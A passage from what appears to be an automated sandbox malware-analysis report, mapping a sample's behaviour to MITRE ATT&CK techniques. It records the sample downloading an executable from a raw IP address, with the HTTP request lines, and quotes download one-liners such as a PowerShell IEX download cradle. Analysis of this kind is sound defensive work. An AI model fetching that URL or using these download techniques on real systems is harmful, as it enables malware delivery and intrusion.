Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "INFO", "description": "(Process #1) vbzxc122.exe downloads Windows executable via http from http://176.65.142.252/HOST/gen1.exe."}]}]}, {"id": "TA0004", "name": "Privilege Escalation", "link": "https://attack.mitre.org/tactics/TA0004/", "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.

Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.

Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /HOST/gen1.exe HTTP/1.1Host: 176.65.142.252Connection: Keep-Alive", "GET /json.gp HTTP/1.1Host: geoplugin.netCache-Control: no-cache", "HTTP/1.1 200 OKDate: Tue, 27 May 2025 16:12:04 GMTServer: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30Last-Modified: Mon, 26 May 2025 10:09:50 GMTETag: \"75400-6360725f8d780\"Accept-Ranges: bytesConte"]}, {"severity": "INFO", "description": "Downloads executable code via HTTP", "match_data": ["GET /HOST/gen1.exe HTTP/1.1Host: 176.65.142.252Connection: Keep-Alive", "GET /json.gp HTTP/1.1Host: geoplugin.netCache-Control: no-cache", "HTTP/1.1 200 OKDate: Tue, 27 May 2025 16:12:04 GMTServer: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30Last-Modified: Mon, 26 May 2025 10:09:50 GMTETag: \"75400-6360725f8d780\"Accept-Ranges: bytesConte"]}]}, {"id": "T1095", "name": "Non-Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1095/", "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network.

Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark.
